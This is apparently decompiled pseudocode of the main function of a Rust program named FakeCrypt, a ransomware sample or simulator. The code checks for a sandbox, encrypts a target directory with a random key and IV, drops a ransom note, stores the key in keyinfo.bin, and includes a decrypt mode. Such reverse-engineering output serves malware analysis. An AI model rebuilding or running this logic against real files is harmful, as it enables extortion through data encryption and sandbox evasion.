__int64 FakeCrypt::main()
{
  __int64 v0; // r12
  __int64 v1; // r14
  __int64 v2; // rbx
  int v3; // r15d
  __int64 v4; // r15
  __int64 v5; // r12
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rdx
  __int128 *v10; // rax
  char v11; // cl
  __int64 v12; // rdx
  __int128 v13; // xmm0
  _OWORD *v14; // rax
  char v15; // cl
  __int64 v16; // rdx
  char **v18; // rdx
  char ***v19; // [rsp+0h] [rbp-168h] BYREF
  __int64 (__fastcall *v20)(); // [rsp+8h] [rbp-160h]
  _OWORD v21[2]; // [rsp+10h] [rbp-158h] BYREF
  char **v22; // [rsp+38h] [rbp-130h] BYREF
  __int64 (__fastcall *v23)(); // [rsp+40h] [rbp-128h]
  char ***v24; // [rsp+48h] [rbp-120h]
  _BYTE dest[160]; // [rsp+50h] [rbp-118h] BYREF
  __int128 v26; // [rsp+100h] [rbp-68h] BYREF
  _QWORD v27[2]; // [rsp+118h] [rbp-50h] BYREF
  _BYTE v28[8]; // [rsp+128h] [rbp-40h] BYREF
  __int64 v29; // [rsp+130h] [rbp-38h]
  __int64 v30; // [rsp+138h] [rbp-30h]
  __int64 v31; // [rsp+140h] [rbp-28h] BYREF

  if ( (unsigned __int8)FakeCrypt::stealth::is_sandbox() )
  {
    *(_QWORD *)dest = &off_D9350;
    *(_QWORD *)&dest[8] = 1LL;
    *(_QWORD *)&dest[16] = 8LL;
    *(_OWORD *)&dest[24] = 0LL;
    std::io::stdio::_print(dest);
    std::process::exit(1);
  }
  std::env::args(dest);
  core::iter::traits::iterator::Iterator::collect(v28, dest);
  if ( v30 != 3 )
  {
    if ( !v30 )
    {
      v18 = &off_D9560;
      goto LABEL_22;
    }
    goto LABEL_24;
  }
  v0 = v29;
  v31 = v29 + 48;
  v1 = *(_QWORD *)(v29 + 56);
  v2 = *(_QWORD *)(v29 + 64);
  std::fs::metadata(dest);
  v3 = *(_DWORD *)dest;
  core::ptr::drop_in_place<core::result::Result<std::fs::Metadata,std::io::error::Error>>(dest, v1);
  if ( v3 == 2 || !(unsigned __int8)std::path::Path::is_dir(v1, v2) )
  {
    *(_QWORD *)&v21[0] = &v31;
    *((_QWORD *)&v21[0] + 1) = <&T as core::fmt::Display>::fmt;
    *(_QWORD *)dest = &off_D9380;
    *(_QWORD *)&dest[8] = 2LL;
    *(_QWORD *)&dest[32] = 0LL;
    *(_QWORD *)&dest[16] = v21;
    *(_QWORD *)&dest[24] = 1LL;
    std::io::stdio::_eprint(dest);
    goto LABEL_25;
  }
  v4 = *(_QWORD *)(v0 + 32);
  v5 = *(_QWORD *)(v0 + 40);
  if ( (unsigned __int8)<[A] as core::slice::cmp::SlicePartialEq<B>>::equal(v4, v5, aEncrypt, 7LL) )
  {
    v27[0] = rand::rngs::thread::thread_rng();
    memset(v21, 0, sizeof(v21));
    v26 = 0LL;
    rand::rng::Rng::fill(v27, v21);
    rand::rng::Rng::fill(v27, &v26);
    v22 = (char **)v1;
    v23 = (__int64 (__fastcall *)())v2;
    v19 = &v22;
    v20 = <std::path::Display as core::fmt::Display>::fmt;
    *(_QWORD *)dest = &off_D93A0;
    *(_QWORD *)&dest[8] = 2LL;
    *(_QWORD *)&dest[32] = 0LL;
    *(_QWORD *)&dest[16] = &v19;
    *(_QWORD *)&dest[24] = 1LL;
    std::io::stdio::_print(dest);
    FakeCrypt::fileops::encrypt_directory(v1, v2, (__int64)v21, (__int64)&v26);
    *(_QWORD *)dest = &off_D93C0;
    *(_QWORD *)&dest[8] = 1LL;
    *(_QWORD *)&dest[16] = 8LL;
    *(_OWORD *)&dest[24] = 0LL;
    std::io::stdio::_print(dest);
    FakeCrypt::fileops::drop_ransom_note();
    std::fs::File::create(dest, aKeyinfoBin, 11LL);
    LODWORD(v19) = core::result::Result<T,E>::expect(dest, aFailedToCreate, 25LL, &off_D9518);
    v6 = std::io::Write::write_all(&v19, v21, 32LL);
    core::result::Result<T,E>::expect(v6, aFailedToWriteK, 19LL, &off_D9530);
    v7 = std::io::Write::write_all(&v19, &v26, 16LL);
    core::result::Result<T,E>::expect(v7, aFailedToWriteI, 18LL, &off_D9548);
    v22 = &off_D9478;
    v23 = <&T as core::fmt::Display>::fmt;
    *(_QWORD *)dest = &off_D93D0;
    *(_QWORD *)&dest[8] = 2LL;
    *(_QWORD *)&dest[32] = 0LL;
    *(_QWORD *)&dest[16] = &v22;
    *(_QWORD *)&dest[24] = 1LL;
    std::io::stdio::_print(dest);
    core::ptr::drop_in_place<std::fs::File>((unsigned int)v19);
    core::ptr::drop_in_place<rand::rngs::thread::ThreadRng>(v27);
    return core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(v28);
  }
  if ( !(unsigned __int8)<[A] as core::slice::cmp::SlicePartialEq<B>>::equal(v4, v5, aDecrypt, 7LL) )
  {
    if ( !v30 )
    {
      v18 = &off_D9460;
LABEL_22:
      core::panicking::panic_bounds_check(0LL, 0LL, v18);
    }
LABEL_24:
    *(_QWORD *)&v21[0] = v29;
    *((_QWORD *)&v21[0] + 1) = <alloc::string::String as core::fmt::Display>::fmt;
    *(_QWORD *)dest = &off_D9360;
    *(_QWORD *)&dest[8] = 2LL;
    *(_QWORD *)&dest[32] = 0LL;
    *(_QWORD *)&dest[16] = v21;
    *(_QWORD *)&dest[24] = 1LL;
    std::io::stdio::_eprint(dest);
LABEL_25:
    std::process::exit(1);
  }
  *(_QWORD *)&v21[0] = &off_D9478;
  *((_QWORD *)&v21[0] + 1) = <&T as core::fmt::Display>::fmt;
  *(_QWORD *)dest = &off_D93F0;
  *(_QWORD *)&dest[8] = 2LL;
  *(_QWORD *)&dest[32] = 0LL;
  *(_QWORD *)&dest[16] = v21;
  *(_QWORD *)&dest[24] = 1LL;
  std::io::stdio::_print(dest);
  v22 = 0LL;
  v23 = (__int64 (__fastcall *)())(&dword_0 + 1);
  v24 = 0LL;
  std::fs::File::open(dest, aKeyinfoBin, 11LL);
  LODWORD(v21[0]) = core::result::Result<T,E>::expect(dest, aCouldNotOpenKe, 23LL, &off_D9488);
  v8 = <std::fs::File as std::io::Read>::read_to_end(v21, &v22);
  core::result::Result<T,E>::expect(v8, v9);
  core::ptr::drop_in_place<std::fs::File>(LODWORD(v21[0]));
  if ( v24 != (char ***)&dword_30 )
  {
    v19 = v24;
    *(_QWORD *)&v21[0] = &v19;
    *((_QWORD *)&v21[0] + 1) = core::fmt::num::imp::<impl core::fmt::Display for usize>::fmt;
    *(_QWORD *)dest = &off_D9410;
    *(_QWORD *)&dest[8] = 2LL;
    *(_QWORD *)&dest[32] = 0LL;
    *(_QWORD *)&dest[16] = v21;
    *(_QWORD *)&dest[24] = 1LL;
    std::io::stdio::_eprint(dest);
    std::process::exit(1);
  }
  v10 = (__int128 *)<core::ops::range::Range<usize> as core::slice::index::SliceIndex<[T]>>::index(
                      0LL,
                      32LL,
                      v23,
                      48LL,
                      &off_D94B8);
  v11 = 1;
  if ( v12 == 32 )
  {
    v13 = *v10;
    *(_OWORD *)&dest[17] = v10[1];
    *(_OWORD *)&dest[1] = v13;
    v11 = 0;
  }
  dest[0] = v11;
  core::result::Result<T,E>::unwrap(v21, dest);
  v14 = (_OWORD *)<core::ops::range::Range<usize> as core::slice::index::SliceIndex<[T]>>::index(
                    32LL,
                    48LL,
                    v23,
                    v24,
                    &off_D94E8);
  v15 = 1;
  if ( v16 == 16 )
  {
    *(_OWORD *)&dest[1] = *v14;
    v15 = 0;
  }
  dest[0] = v15;
  core::result::Result<T,E>::unwrap(v27, dest);
  v19 = (char ***)v1;
  v20 = (__int64 (__fastcall *)())v2;
  *(_QWORD *)&v26 = &v19;
  *((_QWORD *)&v26 + 1) = <std::path::Display as core::fmt::Display>::fmt;
  *(_QWORD *)dest = &off_D9430;
  *(_QWORD *)&dest[8] = 2LL;
  *(_QWORD *)&dest[32] = 0LL;
  *(_QWORD *)&dest[16] = &v26;
  *(_QWORD *)&dest[24] = 1LL;
  std::io::stdio::_print(dest);
  FakeCrypt::fileops::decrypt_directory(v1, v2, (__int64)v21, (__int64)v27);
  *(_QWORD *)dest = &off_D9450;
  *(_QWORD *)&dest[8] = 1LL;
  *(_QWORD *)&dest[16] = 8LL;
  *(_OWORD *)&dest[24] = 0LL;
  std::io::stdio::_print(dest);
  core::ptr::drop_in_place<alloc::vec::Vec<u8>>(&v22);
  return core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(v28);
}